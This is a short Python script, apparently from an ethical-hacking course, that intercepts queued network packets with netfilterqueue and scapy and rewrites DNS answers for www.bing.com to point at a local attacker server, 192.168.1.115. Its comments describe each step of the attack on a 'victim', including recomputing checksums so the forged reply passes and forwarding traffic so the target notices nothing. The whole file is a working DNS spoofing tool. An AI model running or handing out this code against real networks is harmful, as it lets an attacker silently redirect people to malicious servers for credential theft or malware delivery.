import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    # We are getting the packet information and storing it in scapy_packet
    scapy_packet = scapy.IP(packet.get_payload())

    # We are checking to execute on the DNS Response Record, so this if is a check
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        # We are checking to see if the target is trying to access the site we want them to access for our attack to
        # be a success
        if "www.bing.com" in qname:
            print("spoofing target")

            # This is us modifying the packet with information of our own web server instead of their requested one
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.115")
            scapy_packet[scapy.DNS].an = answer
            # This next line ensures that our victim only gets one answer to their request instead of multiple
            scapy_packet[scapy.DNS].ancount = 1

            # We are deleting the len and chksum(check sum) fields so they do not interfere in our attack.
            # Scapy will recalculate these fields and send the spoofed ones
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # Finally all the details that we have modified in the packet, we are applying them to the actual packet.
            packet.set_payload(str(scapy_packet))

    packet.accept()  # This line will forward the captured packet to its destination allowing your victim internet
    # access.
    # xpacket.drop() # We are dropping the packets, basically not forwarding them.


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
